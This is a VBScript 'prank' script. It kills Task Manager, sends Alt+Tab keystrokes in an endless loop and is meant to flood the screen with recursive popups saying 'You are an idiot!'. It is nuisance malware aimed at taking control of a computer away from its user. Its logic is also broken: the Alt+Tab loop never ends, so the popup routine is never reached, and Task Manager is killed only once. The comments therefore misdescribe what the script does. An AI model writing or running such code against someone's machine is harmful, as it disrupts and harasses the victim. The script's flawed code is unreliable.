Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Function to prevent Task Manager from running
Sub BlockTaskManager()
    On Error Resume Next
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
    For Each objItem In colItems
        objItem.Terminate
    Next
End Sub

' Block Alt + F4 key
Sub BlockAltF4()
    Do
        WshShell.SendKeys "%{TAB}" ' Simulate Alt+Tab to change focus
        WScript.Sleep 1000 ' Wait for 1 second before doing it again
    Loop
End Sub

' Function to open and multiply popups
Sub ShowPopup()
    Do
        WshShell.Popup "You are an idiot!", 2, "Prank Time!", 64
        WScript.Sleep 500 ' Wait before showing the next popup
        ShowPopup ' Call the function again to double the popups
    Loop
End Sub

' Start the blocking process in the background
Call BlockTaskManager
Call BlockAltF4
Call ShowPopup
